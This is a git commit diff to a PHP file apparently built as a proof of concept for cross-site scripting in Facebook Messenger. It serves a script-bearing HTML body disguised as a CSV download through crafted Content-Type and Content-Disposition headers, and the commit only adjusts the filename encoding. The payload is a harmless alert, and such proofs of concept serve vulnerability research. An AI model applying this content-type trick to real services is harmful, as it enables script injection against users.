caf9670527f26ca364205cdba249952818443523
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-15 02:19:30 +0100

    Update fbmessenegerxss.php

--- fbmessenegerxss.php
+++ fbmessenegerxss.php
@@ -2,10 +2,9 @@
 
 header('Content-Type: text/csv; charset=utf-16le');
 header('X-content-type-options: nosniff');
-header('Content-Disposition: attachment; filename="GoogleBooksTrafficReport.csv"; filename*=UTF-8''GoogleBooksTrafficReport.csv');
+header('Content-Disposition: attachment; filename="GoogleBooksTrafficReport.csv"; filename*=UTF-8%27%27GoogleBooksTrafficReport.csv');
 
 ?>
-
 <html>
   <script>alert(0)</script>
 </html>
